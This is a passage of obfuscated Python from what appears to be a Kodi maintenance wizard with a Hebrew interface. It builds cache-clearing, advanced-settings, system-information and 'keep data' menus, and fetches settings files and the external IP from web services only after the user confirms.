		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O0O0OOO0OO000O0OO .replace ('true',OO00O0O0OO0O0O00O ).replace ('false',OO0O00000O0000O00 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2877
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2878
	addFile ('Include Video Cache in Clear Cache: %s'%OOOO00O0O0000O0OO .replace ('true',OO00O0O0OO0O0O00O ).replace ('false',OO0O00000O0000O00 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2879
	if OOOO00O0O0000O0OO =='true':#line:2880
		addFile ('--- Include All Video Addons: %s'%OOO0O0OOO0O00O0OO .replace ('true',OO00O0O0OO0O0O00O ).replace ('false',OO0O00000O0000O00 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2881
		addFile ('--- Include Bob: %s'%OO0000O0O0O00O0OO .replace ('true',OO00O0O0OO0O0O00O ).replace ('false',OO0O00000O0000O00 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2882
		addFile ('--- Include Phoenix: %s'%OOO000OOO0OOOOO0O .replace ('true',OO00O0O0OO0O0O00O ).replace ('false',OO0O00000O0000O00 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2883
		addFile ('--- Include Specto: %s'%O0OOO0OOO00000OOO .replace ('true',OO00O0O0OO0O0O00O ).replace ('false',OO0O00000O0000O00 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2884
		addFile ('--- Include Exodus: %s'%O0000OO000000O0OO .replace ('true',OO00O0O0OO0O0O00O ).replace ('false',OO0O00000O0000O00 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2885
		addFile ('--- Include Salts: %s'%O000OOO0OO0O00O00 .replace ('true',OO00O0O0OO0O0O00O ).replace ('false',OO0O00000O0000O00 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2886
		addFile ('--- Include Salts HD Lite: %s'%O0O0O0O00O0O0OO00 .replace ('true',OO00O0O0OO0O0O00O ).replace ('false',OO0O00000O0000O00 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2887
		addFile ('--- Include One Channel: %s'%O00OOOOO00OO000O0 .replace ('true',OO00O0O0OO0O0O00O ).replace ('false',OO0O00000O0000O00 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2888
		addFile ('--- Include Genesis: %s'%OOOO000OO0OOOOOO0 .replace ('true',OO00O0O0OO0O0O00O ).replace ('false',OO0O00000O0000O00 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2889
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2890
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2891
	setView ('files','viewType')#line:2892
def advancedWindow (url =None ):#line:2894
	if not ADVANCEDFILE =='http://':#line:2895
		if url ==None :#line:2896
			OOO00O0OOO00OOO0O =wiz .workingURL (ADVANCEDFILE )#line:2897
			O0OOO00OOO0O0O00O =uservar .ADVANCEDFILE #line:2898
		else :#line:2899
			OOO00O0OOO00OOO0O =wiz .workingURL (url )#line:2900
			O0OOO00OOO0O0O00O =url #line:2901
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2902
		if os .path .exists (ADVANCED ):#line:2903
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2904
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2905
		if OOO00O0OOO00OOO0O ==True :#line:2906
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2907
			O0OO0O0000O000OO0 =wiz .openURL (O0OOO00OOO0O0O00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2908
			O00OOOO00OOOOOOOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0OO0O0000O000OO0 )#line:2909
			if len (O00OOOO00OOOOOOOO )>0 :#line:2910
				for O0O00O00OOOO00OOO ,OOO000O0O0OOO0O0O ,url ,OO0O0O00OOOO00O0O ,O00O00OO0O0O0OO00 ,OOO000000O0000OOO in O00OOOO00OOOOOOOO :#line:2911
					if OOO000O0O0OOO0O0O .lower ()=="yes":#line:2912
						addDir ("[B]%s[/B]"%O0O00O00OOOO00OOO ,'advancedsetting',url ,description =OOO000000O0000OOO ,icon =OO0O0O00OOOO00O0O ,fanart =O00O00OO0O0O0OO00 ,themeit =THEME3 )#line:2913
					else :#line:2914
						addFile (O0O00O00OOOO00OOO ,'writeadvanced',O0O00O00OOOO00OOO ,url ,description =OOO000000O0000OOO ,icon =OO0O0O00OOOO00O0O ,fanart =O00O00OO0O0O0OO00 ,themeit =THEME2 )#line:2915
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2916
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OOO00O0OOO00OOO0O )#line:2917
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2918
def writeAdvanced (O0O00O00O0O0000O0 ,O0000O0OO00O0OOOO ):#line:2920
	O0OOO00O0O000OO00 =wiz .workingURL (O0000O0OO00O0OOOO )#line:2921
	if O0OOO00O0O000OO00 ==True :#line:2922
		if os .path .exists (ADVANCED ):OOOO00OO00OOO00O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0O00O00O0O0000O0 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2923
		else :OOOO00OO00OOO00O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0O00O00O0O0000O0 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2924
		if OOOO00OO00OOO00O0 ==1 :#line:2926
			OO0OO0OO0000000OO =wiz .openURL (O0000O0OO00O0OOOO )#line:2927
			OO00O0000O0OOO000 =open (ADVANCED ,'w');#line:2928
			OO00O0000O0OOO000 .write (OO0OO0OO0000000OO )#line:2929
			OO00O0000O0OOO000 .close ()#line:2930
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2931
			wiz .killxbmc (True )#line:2932
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2933
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O0OOO00O0O000OO00 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2934
def viewAdvanced ():#line:2936
	OOO00OO0OO000OOO0 =open (ADVANCED )#line:2937
	O00000OO0OO0O0OOO =OOO00OO0OO000OOO0 .read ().replace ('\t','    ')#line:2938
	wiz .TextBox (ADDONTITLE ,O00000OO0OO0O0OOO )#line:2939
	OOO00OO0OO000OOO0 .close ()#line:2940
def removeAdvanced ():#line:2942
	if os .path .exists (ADVANCED ):#line:2943
		wiz .removeFile (ADVANCED )#line:2944
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2945
def showAutoAdvanced ():#line:2947
	notify .autoConfig ()#line:2948
def getIP ():#line:2950
	OO0O00OOOOOOOOO0O ='http://whatismyipaddress.com/'#line:2951
	if not wiz .workingURL (OO0O00OOOOOOOOO0O ):return 'Unknown','Unknown','Unknown'#line:2952
	OO0O0000OO0OO0OO0 =wiz .openURL (OO0O00OOOOOOOOO0O ).replace ('\n','').replace ('\r','')#line:2953
	if not 'Access Denied'in OO0O0000OO0OO0OO0 :#line:2954
		OOO0OO0O00000000O =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OO0O0000OO0OO0OO0 )#line:2955
		OO0OO00000OOOO0O0 =OOO0OO0O00000000O [0 ]if (len (OOO0OO0O00000000O )>0 )else 'Unknown'#line:2956
		O00OO0OO00OO0O0O0 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OO0O0000OO0OO0OO0 )#line:2957
		O000O0O0OOOO0O00O =O00OO0OO00OO0O0O0 [0 ]if (len (O00OO0OO00OO0O0O0 )>0 )else 'Unknown'#line:2958
		O0OOOOOOOO0O00OO0 =O00OO0OO00OO0O0O0 [1 ]+', '+O00OO0OO00OO0O0O0 [2 ]+', '+O00OO0OO00OO0O0O0 [3 ]if (len (O00OO0OO00OO0O0O0 )>2 )else 'Unknown'#line:2959
		return OO0OO00000OOOO0O0 ,O000O0O0OOOO0O00O ,O0OOOOOOOO0O00OO0 #line:2960
	else :return 'Unknown','Unknown','Unknown'#line:2961
def systemInfo ():#line:2963
	OOOOOO0O00OO0O00O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2977
	O0OO00O0O0OOOO0O0 =[];OOO00OO0O0OO00OOO =0 #line:2978
	for O000OO000OO000O00 in OOOOOO0O00OO0O00O :#line:2979
		O00O0O0OO0OO00O0O =wiz .getInfo (O000OO000OO000O00 )#line:2980
		O0O00O00O0O0O00O0 =0 #line:2981
		while O00O0O0OO0OO00O0O =="Busy"and O0O00O00O0O0O00O0 <10 :#line:2982
			O00O0O0OO0OO00O0O =wiz .getInfo (O000OO000OO000O00 );O0O00O00O0O0O00O0 +=1 ;wiz .log ("%s sleep %s"%(O000OO000OO000O00 ,str (O0O00O00O0O0O00O0 )));xbmc .sleep (1000 )#line:2983
		O0OO00O0O0OOOO0O0 .append (O00O0O0OO0OO00O0O )#line:2984
		OOO00OO0O0OO00OOO +=1 #line:2985
	OOO0O0OOO0O0O0OOO =O0OO00O0O0OOOO0O0 [8 ]if 'Una'in O0OO00O0O0OOOO0O0 [8 ]else wiz .convertSize (int (float (O0OO00O0O0OOOO0O0 [8 ][:-8 ]))*1024 *1024 )#line:2986
	OOOOO0000O0OOOOOO =O0OO00O0O0OOOO0O0 [9 ]if 'Una'in O0OO00O0O0OOOO0O0 [9 ]else wiz .convertSize (int (float (O0OO00O0O0OOOO0O0 [9 ][:-8 ]))*1024 *1024 )#line:2987
	O00O0OO0O0000O0O0 =O0OO00O0O0OOOO0O0 [10 ]if 'Una'in O0OO00O0O0OOOO0O0 [10 ]else wiz .convertSize (int (float (O0OO00O0O0OOOO0O0 [10 ][:-8 ]))*1024 *1024 )#line:2988
	OO000O00O00O00O0O =wiz .convertSize (int (float (O0OO00O0O0OOOO0O0 [11 ][:-2 ]))*1024 *1024 )#line:2989
	O0OO0OOO000O000O0 =wiz .convertSize (int (float (O0OO00O0O0OOOO0O0 [12 ][:-2 ]))*1024 *1024 )#line:2990
	O0O000OOO00O0000O =wiz .convertSize (int (float (O0OO00O0O0OOOO0O0 [13 ][:-2 ]))*1024 *1024 )#line:2991
	OOO0O0O0OOOOO0O00 ,O0O000OOOO000O00O ,OOOO0O0OO000OO0O0 =getIP ()#line:2992
	OOO00OOOO0O0O0O00 =[];O0O0OO00000O0O00O =[];OOO0OO00OOOOOOO00 =[];OO0OO0O0OO0O0O0OO =[];OOO0O00000OOO0O00 =[];O0OOO00OO0000O0OO =[];O00O000OOOO00OO00 =[]#line:2994
	OOO0O0OO0O0OO0OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:2996
	for OOOO0O00000O00O00 in sorted (OOO0O0OO0O0OO0OO0 ,key =lambda O0OO0O0OO0OOO0O0O :O0OO0O0OO0OOO0O0O ):#line:2997
		OOO00OOO0OOO00O00 =os .path .split (OOOO0O00000O00O00 [:-1 ])[1 ]#line:2998
		if OOO00OOO0OOO00O00 =='packages':continue #line:2999
		OO0000000O00OOOOO =os .path .join (OOOO0O00000O00O00 ,'addon.xml')#line:3000
		if os .path .exists (OO0000000O00OOOOO ):#line:3001
			OOOOOOOO0OOOO0O0O =open (OO0000000O00OOOOO )#line:3002
			OOO000OO00O0OO0OO =OOOOOOOO0OOOO0O0O .read ()#line:3003
			OOO0000OO0OO0OO0O =re .compile ("<provides>(.+?)</provides>").findall (OOO000OO00O0OO0OO )#line:3004
			if len (OOO0000OO0OO0OO0O )==0 :#line:3005
				if OOO00OOO0OOO00O00 .startswith ('skin'):O00O000OOOO00OO00 .append (OOO00OOO0OOO00O00 )#line:3006
				if OOO00OOO0OOO00O00 .startswith ('repo'):OOO0O00000OOO0O00 .append (OOO00OOO0OOO00O00 )#line:3007
				else :O0OOO00OO0000O0OO .append (OOO00OOO0OOO00O00 )#line:3008
			elif not (OOO0000OO0OO0OO0O [0 ]).find ('executable')==-1 :OO0OO0O0OO0O0O0OO .append (OOO00OOO0OOO00O00 )#line:3009
			elif not (OOO0000OO0OO0OO0O [0 ]).find ('video')==-1 :OOO0OO00OOOOOOO00 .append (OOO00OOO0OOO00O00 )#line:3010
			elif not (OOO0000OO0OO0OO0O [0 ]).find ('audio')==-1 :O0O0OO00000O0O00O .append (OOO00OOO0OOO00O00 )#line:3011
			elif not (OOO0000OO0OO0OO0O [0 ]).find ('image')==-1 :OOO00OOOO0O0O0O00 .append (OOO00OOO0OOO00O00 )#line:3012
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3014
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00O0O0OOOO0O0 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3015
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00O0O0OOOO0O0 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3016
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3017
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00O0O0OOOO0O0 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3018
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00O0O0OOOO0O0 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3019
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3021
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00O0O0OOOO0O0 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3022
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00O0O0OOOO0O0 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3023
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3025
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0OOO0O0O0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3026
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0000O0OOOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3027
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OO0O0000O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3028
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3030
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O00O00O00O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3031
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0OOO000O000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3032
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000OOO00O0000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3033
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3035
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00O0O0OOOO0O0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3036
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O0OOOOO0O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3037
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000OOOO000O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3038
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O0OO000OO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3039
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00O0O0OOOO0O0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3040
	OOOO00O0O000OOOO0 =len (OOO00OOOO0O0O0O00 )+len (O0O0OO00000O0O00O )+len (OOO0OO00OOOOOOO00 )+len (OO0OO0O0OO0O0O0OO )+len (O0OOO00OO0000O0OO )+len (O00O000OOOO00OO00 )+len (OOO0O00000OOO0O00 )#line:3042
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OOOO00O0O000OOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3043
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0OO00OOOOOOO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3044
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OO0O0OO0O0O0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3045
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OO00000O0O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3046
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO00OOOO0O0O0O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3047
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0O00000OOO0O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3048
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O000OOOO00OO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3049
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOO00OO0000O0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3050
def Menu ():#line:3051
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3052
def saveMenu ():#line:3054
	OOOO000OO000O00OO ='[COLOR yellow]מופעל[/COLOR]';OOO00O0O00OO0000O ='[COLOR blue]מבוטל[/COLOR]'#line:3056
	OO000O00O0O0O0O00 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3057
	O0000OOOO0OO0O00O ='true'if KEEPMOVIELIST =='true'else 'false'#line:3058
	OOOO000O000OOOO0O ='true'if KEEPINFO =='true'else 'false'#line:3059
	OO0OO0O0OO00OO0OO ='true'if KEEPSOUND =='true'else 'false'#line:3061
	OO0O0O00O0000O0OO ='true'if KEEPVIEW =='true'else 'false'#line:3062
	O00O0OO00OO000O0O ='true'if KEEPSKIN =='true'else 'false'#line:3063
	OOOO00O0O0O0OOOO0 ='true'if KEEPSKIN2 =='true'else 'false'#line:3064
	O00OO00OO000O0OO0 ='true'if KEEPSKIN3 =='true'else 'false'#line:3065
	O0OO000O000000OOO ='true'if KEEPADDONS =='true'else 'false'#line:3066
	OO0O0OO000OOO0OO0 ='true'if KEEPPVR =='true'else 'false'#line:3067
	O00OOO00O0000OOOO ='true'if KEEPTVLIST =='true'else 'false'#line:3068
	OOO00OO0OO000OO0O ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3069
	OOOOOO0OO00O0OOOO ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3070
	O0OOO00000O0OO0OO ='true'if KEEPHUBTV =='true'else 'false'#line:3071
	O0O00OOO000O00000 ='true'if KEEPHUBVOD =='true'else 'false'#line:3072
	O0O0O0O0000OOO000 ='true'if KEEPHUBSPORT =='true'else 'false'#line:3073
	O0O0000O0OO0O000O ='true'if KEEPHUBKIDS =='true'else 'false'#line:3074
	OO0OOOO0OOO0000O0 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3075
	O00O00000O0OOOO00 ='true'if KEEPHUBMENU =='true'else 'false'#line:3076
	O0O0OO0000O0OO00O ='true'if KEEPPLAYLIST =='true'else 'false'#line:3077
	OOO00O000O00000O0 ='true'if KEEPTRAKT =='true'else 'false'#line:3078
	O0O000O0O00OO0OO0 ='true'if KEEPREAL =='true'else 'false'#line:3079
	O00O0OOOOOOOO0000 ='true'if KEEPRD2 =='true'else 'false'#line:3080
	OOOO0OO0OOO0O0000 ='true'if KEEPTORNET =='true'else 'true'#line:3081
	O00O0OOOOO00O0000 ='true'if KEEPLOGIN =='true'else 'false'#line:3082
	OOOOO0OO000O0OOOO ='true'if KEEPSOURCES =='true'else 'false'#line:3083
	O00000O000000O000 ='true'if KEEPADVANCED =='true'else 'false'#line:3084
	O000O00O00000000O ='true'if KEEPPROFILES =='true'else 'false'#line:3085
	OOO0O0OOOO000O0OO ='true'if KEEPFAVS =='true'else 'false'#line:3086
	OOO0OOO00O000OO0O ='true'if KEEPREPOS =='true'else 'false'#line:3087
	OOOOOOO0O0000OOOO ='true'if KEEPSUPER =='true'else 'false'#line:3088
	O00OOOO000OOO0OO0 ='true'if KEEPWHITELIST =='true'else 'false'#line:3089
	O0OO0OO0OO0O00O00 ='true'if KEEPWEATHER =='true'else 'false'#line:3090
	if O00OOOO000OOO0OO0 =='true':#line:3094
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3095
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3096
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3097
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3098
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3099
	addFile ('%s התקנת קיר סרטים: '%OO000O00O0O0O0O00 .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:3101
	addFile ('%s שמירת חשבון RD:  '%O0O000O0O00OO0OO0 .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3102
	addFile ('%s שמירת חשבון טראקט:  '%OOO00O000O00000O0 .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3103
	addFile ('%s שמירת מועדפים:  '%OOO0O0OOOO000O0OO .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3106
	addFile ('%s שמירת לקוח טלוויזיה:  '%OO0O0OO000OOO0OO0 .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3107
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O00OOO00O0000OOOO .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3108
	addFile ('%s שמירת אריח סרטים:  '%OOO00OO0OO000OO0O .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3109
	addFile ('%s שמירת אריח סדרות:  '%OOOOOO0OO00O0OOOO .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3110
	addFile ('%s שמירת אריח טלויזיה:  '%O0OOO00000O0OO0OO .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3111
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O0O00OOO000O00000 .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3112
	addFile ('%s שמירת אריח ספורט:  '%O0O0O0O0000OOO000 .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3113
	addFile ('%s שמירת אריח ילדים:  '%O0O0000O0OO0O000O .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3114
	addFile ('%s שמירת אריח מוסיקה:  '%OO0OOOO0OOO0000O0 .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3115
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O00O00000O0OOOO00 .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3116
	addFile ('%s שמירת כל האריחים בסקין:  '%O00O0OO00OO000O0O .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3117
	addFile ('%s שמירת הגדרות מזג האוויר:  '%O0OO0OO0OO0O00O00 .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3118
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O0OO000O000000OOO .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3124
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות:  '%OOOO000O000OOOO0O .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3125
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%O0000OOOO0OO0O00O .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת מקורות וידאו:  '%OOOOO0OO000O0OOOO .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3129
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OO0OO0O0OO00OO0OO .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3130
